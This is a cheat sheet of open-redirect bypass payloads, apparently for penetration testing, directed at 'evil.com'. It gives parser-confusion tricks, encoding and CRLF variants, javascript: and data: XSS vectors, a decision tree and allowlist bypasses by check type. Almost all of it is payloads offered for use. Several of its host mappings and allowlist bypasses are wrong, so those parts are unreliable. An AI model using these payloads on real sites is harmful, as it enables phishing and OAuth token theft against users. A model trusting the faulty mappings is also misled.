# Open Redirect — Bypass Mutation Algebra

When direct external redirect is blocked, apply these URL parser confusion techniques.

## Dimension 1: Protocol and Scheme Variants
- `//evil.com/` — scheme-relative URL (inherits protocol of current page)
- `https://evil.com` → `//evil.com` when https-only filter
- `javascript:alert(1)` — JavaScript protocol (may execute as XSS if redirect is followed by browser)
- `data:text/html,<script>alert(1)</script>` — data URI redirect
- `\evil.com\path` — UNC-style path (Windows environments)

## Dimension 2: URL Authority Confusion (@ and : tricks)
These exploit differences in how URL parsers split authority and path:

| Payload | Intended host | Real redirect |
|---|---|---|
| `https://evil.com@target.com/` | target.com (userinfo=evil.com) | evil.com |
| `https://target.com@evil.com/` | evil.com | evil.com (legitimate confusion) |
| `https://evil.com%40target.com/` | evil.com (encoded @) | evil.com |
| `https://target.com#@evil.com/` | target.com (fragment) | evil.com |
| `https://target.com:443@evil.com/` | evil.com (port+@ confusion) | evil.com |

## Dimension 3: Subdomain and Domain Lookalike
When allowlist checks if URL starts with trusted domain:
- `https://target.com.evil.com/` — subdomain of evil.com looking like target.com
- `https://evil.target.com/` — subdomain of target.com (if attacker controls subdomains)
- `https://target.com-evil.com/` — hyphenated domain
- `https://targetcom.evil.com/` — dot replaced with nothing
- `https://target.com..evil.com/` — dot confusion

## Dimension 4: Path Traversal in redirect_uri
When allowlist allows any path under the domain:
- `https://target.com/callback/../../../evil.com` — path traversal in URL
- `https://target.com/callback?next=https://evil.com` — nested redirect parameter
- `https://target.com/callback#https://evil.com` — fragment-based bypass
- `https://target.com/callback\evil.com` — backslash confusion in path

## Dimension 5: Encoding Pivots
When filter normalizes before allowlist check:
- `https://evil.com%2F@target.com/` — encoded slash in authority
- `https://evil.com%2523/` — double-encoded path separator
- `https://evil%2ecom/` — encoded dot in hostname
- Null byte: `https://target.com\x00@evil.com/` (some parsers stop at null)
- Newline: `https://target.com%0d%0a@evil.com/` (CRLF in URL)

## Dimension 6: Backslash Separator
Different browsers and parsers treat `\` differently in URLs:
- `https://evil.com\target.com/` — Chrome/Firefox parse `\` as path separator, so `evil.com` is host
- `?next=https:\/\/evil.com` — mixed slash types
- `?next=\/\/evil.com` — escaped backslash-slash

## Decision Tree
```
Direct https://evil.com blocked?
  → Try scheme-relative //evil.com
  → Try @ authority confusion: https://evil.com@target.com/
  → Try subdomain lookalike: target.com.evil.com
  → Try backslash: https://evil.com\target.com/
  → OAuth redirect_uri: path traversal + nested redirect
  → Try encoding pivots: %2F, %2e, null byte
  → All blocked? Document allowlist implementation type
```

## Allowlist Bypass by Type
| Allowlist check | Bypass |
|---|---|
| `startsWith("https://target.com")` | `https://target.com.evil.com/` |
| `contains("target.com")` | `https://evil.com?q=target.com` |
| `endsWith(".target.com")` | `https://evil.com@x.target.com/` |
| Regex `^https?://target\.com/` | `https://target.com@evil.com/` |
| `hostname === "target.com"` | `https://target.com:80@evil.com/` |
